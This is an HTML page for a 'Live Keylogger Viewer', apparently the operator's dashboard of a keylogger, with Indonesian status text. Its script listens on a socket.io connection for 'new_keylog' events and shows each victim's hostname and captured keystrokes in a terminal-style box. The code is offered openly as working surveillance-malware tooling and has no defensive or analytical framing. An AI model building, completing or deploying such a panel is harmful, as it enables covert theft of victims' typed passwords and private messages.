<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Live Keylogger</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: monospace;
    }
    .terminal-box {
      background: #111;
      border: 1px solid #333;
      padding: 1rem;
      border-radius: 8px;
      height: 500px;
      overflow-y: auto;
      white-space: pre-wrap;
      font-size: 15px;
    }
    .status-box {
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="container py-4">
    <h3 class="text-danger mb-3">Live Keylogger Viewer</h3>
    <div class="alert alert-success status-box">ðŸŸ¢ Keylogger Aktif (Realtime)</div>
    <div id="logBox" class="terminal-box">Menunggu log dari target...</div>
  </div>

  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
  <script>
    const socket = io();
    const logBox = document.getElementById("logBox");

    socket.on("new_keylog", (data) => {
      const hostname = data.hostname || "unknown";
      const logLine = `$ [${hostname}] ${data.log}`;
      const div = document.createElement("div");
      div.textContent = logLine;
      logBox.appendChild(div);
      logBox.scrollTop = logBox.scrollHeight;
    });
  </script>
</body>
</html>
